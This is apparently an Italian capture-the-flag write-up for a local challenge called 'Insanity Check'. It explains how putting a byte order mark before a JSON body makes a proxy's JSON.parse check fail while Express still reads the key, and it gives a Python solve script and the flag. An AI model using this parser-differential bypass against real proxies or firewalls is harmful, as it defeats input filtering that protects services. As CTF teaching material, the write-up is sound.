# Insanity Check

## Setup
```
cd build
docker compose up
```
Ora il sito è disponibile al link: [http://localhost:4567](http://localhost:4567).

## Descrizione
il Team CodeVinci ha scoperto i firewall??
Corri a fare first blood

*Author: [@benjamin](https://github.com/b3nj4m1no)*


## Soluzione
Lo scopo era creare un payload in json che rispecchiasse due condizioni:

* Il `backend`, ovvero un parser JSON di Express, lo doveva riconoscere come un JSON contenente una chiave `dammilaflag`.
* Il `proxy` non doveva riuscire ad analizzarlo come un valore JSON a `JSON.parse(req.body)`.
  
In conclusione, il seguente JSON li soddisfa, dove `\ufeff` è un [BOM (Byte Order Mark)](https://en.wikipedia.org/wiki/Byte_order_mark):
```js
\ufeff{"dammilaflag": true}
```

I framework web spesso consentono l'aggiunta di un BOM all'inizio dei valori JSON. 

Ad esempio, Fastify ed Express controllano un BOM a:

* Fastify: https://github.com/fastify/secure-json-parse/blob/v2.7.0/index.js#L20-L23
* Express: https://github.com/ashtuchkin/iconv-lite/blob/v0.6.3/lib/bom-handling.js#L39-L40

D'altra parte, `JSON.parse` non consente un BOM:
```js
> JSON.parse('{"dammilaflag": true}')
{ dammilaflag: true }
> JSON.parse('\ufeff{"dammilaflag": true}')
Uncaught SyntaxError: Unexpected token '', "{"dammil"... is not valid JSON
```

## Solve

```py
# Author: @benjamin

import requests

url = "http://localhost:4567"

payload = '\ufeff{"dammilaflag": true}'.encode('utf-8')  # UTF-8 BOM

r = requests.post(
    url,
    headers = {"Content-Type": "text/plain"},
    data = payload
)

print(r.text)
```

## Flag
`CodeVinciCTF{n3vEr_tRu5t_4_w4f_:drop_of_blood:}`
